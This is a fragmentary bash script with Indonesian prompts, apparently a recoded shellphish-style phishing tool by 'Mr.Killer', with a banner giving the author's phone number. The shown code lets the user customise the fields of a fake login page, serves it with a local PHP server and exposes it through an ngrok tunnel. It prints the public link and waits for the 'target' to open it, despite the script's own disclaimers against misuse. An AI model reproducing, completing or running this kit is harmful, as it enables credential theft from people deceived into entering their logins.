#!/bin/bash
# Warning gunakan sc ini dengan baik jangan di salah gunakan untuk kejahatan
# sc ini hanya untuk memuaskan pengguna tapi tidak boleh di gunakan
# untuk kejahatan
# coder By Mr.Killer Recoder : By @Thelinuxchoice
...
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Pilihan dan opsi \e[0m\en' option
...
printf "\e[1;93m [!] Pilihan anda tidak Filed\e[0m\n"
sleep 1
clear
menu
fi
...
echo ""
echo "@@@@@@@@@@@@@@@@@@@@@@@"
echo "| Author : Mr. Killer |"
echo "|Wa/no hp: 083120840944|"
echo "|Jenis Sc: Tools      |"
echo "|Recide  : shellphis  |"
echo "|git     : https:.....|"
echo "@@@@@@@@@@@@@@@@@@@@@@@"
echo "Gunakan Script Dengan Bijak !!"
echo "pishing tools tidak bertanggung jawab atas apa yang anda lakukan[!]"
echo "pishing TOOLS tidak bertanggung jawab atas kerusakan yang ia perbuat[!]"
printf "\n"
printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by:  @Mr.Killer \e[0m\e[1;93m.:.:.\e[0m\n"
printf "\n"
printf "\n"
}
...
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username tidak jelas (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password tidak jelas (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit tidak jelas (Default: Log-In): \e[0m' sub_text
...
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Menunggu target membuka link tidak mau bersabar ketik  Ctrl + C to Keluar...\e[0m\n"
...
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Gunakan port bebas Contoh (8080)\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
...
printf "\e[1;92m[\e[0m*\e[1;92m] Sedang Mendownload...\n"
...
printf "\e[1;92m[\e[0m*\e[1;92m] Loading php server...\n"
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Loading ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Ni Link nya voss#==>\e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}
